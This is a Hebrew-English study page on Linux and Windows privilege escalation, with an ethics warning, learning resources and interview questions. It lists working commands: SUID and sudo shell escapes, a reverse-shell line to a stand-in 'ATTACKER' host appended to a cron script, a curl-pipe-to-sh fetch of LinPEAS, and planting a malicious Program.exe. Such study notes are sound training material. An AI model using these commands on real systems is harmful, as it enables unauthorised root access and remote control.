# ⬆️ Privilege Escalation — Linux & Windows

> **"You got a shell? Great. Now get root."**
> — כל red teamer אחרי initial foothold.

!!! warning "אזהרה אתית"
    למטרות לימוד והגנה בלבד. Privilege escalation ללא הרשאה = עבירה פלילית.

---

## Linux Privilege Escalation

### SUID Binaries
```bash
# מצא binaries עם SUID bit
find / -perm -4000 2>/dev/null

# אם find יש SUID:
find . -exec /bin/sh -p \; -quit
```

### Sudo Misconfigurations
```bash
sudo -l  # מה מותר לי להריץ כ-sudo?

# אם מותר vim:
sudo vim -c '!sh'

# אם מותר python:
sudo python -c 'import os; os.system("/bin/sh")'
```

### Cron Jobs
```bash
cat /etc/crontab
# אם cron job מריץ script writable:
echo '/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/script.sh
```

### Kernel Exploits
```bash
uname -r  # kernel version
# חפשו CVE ל-kernel version → compile → run → root
```

### כלי Enumeration
```bash
# LinPEAS — סריקה אוטומטית
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Windows Privilege Escalation

### Token Impersonation
- **SeImpersonatePrivilege** → Potato attacks (JuicyPotato, PrintSpoofer)
- **SeDebugPrivilege** → Process injection

### Unquoted Service Paths
```
Service path: C:\Program Files\My App\service.exe
Windows tries: C:\Program.exe → C:\Program Files\My.exe → ...
Drop malicious Program.exe → runs as SYSTEM
```

### WinPEAS
```cmd
winpeas.exe
```

---

## 🛤️ מאיפה מתחילים

1. **Linux Basics** — permissions, processes, services
2. **GTFOBins** — https://gtfobins.github.io/ (SUID/sudo exploits)
3. **TryHackMe** — Linux/Windows privesc rooms
4. **HackTheBox** — machines with privesc focus

!!! tip "לימוד אקדמי"
    **קורסים חובה**: מערכות הפעלה (permissions, processes, kernel), אבטחת מידע.

    **מתוכנית הלימודים שלך ב-TAU:**

    - מערכות הפעלה (0368-2162)
    - מבוא לאבטחת מידע (0368-3065)

---

## 💼 שאלות לראיון עבודה

??? tip "מנה 3 טכניקות privesc ב-Linux."
    1. **SUID abuse** — binaries עם SUID bit שמאפשרים shell (GTFOBins).
    2. **Sudo misconfig** — `sudo -l` מגלה programs שמותר להריץ כ-root.
    3. **Cron jobs** — scripts שרצים כ-root עם write permissions.
    עוד: kernel exploits, writable /etc/passwd, capabilities.

??? tip "מה זה SUID ולמה זה מסוכן?"
    SUID = Set User ID. Binary רץ עם הרשאות הבעלים (לרוב root).
    מסוכן כי: אם binary עם SUID מאפשר shell → instant root.
    דוגמה: `find / -exec /bin/sh \;` אם find הוא SUID root.
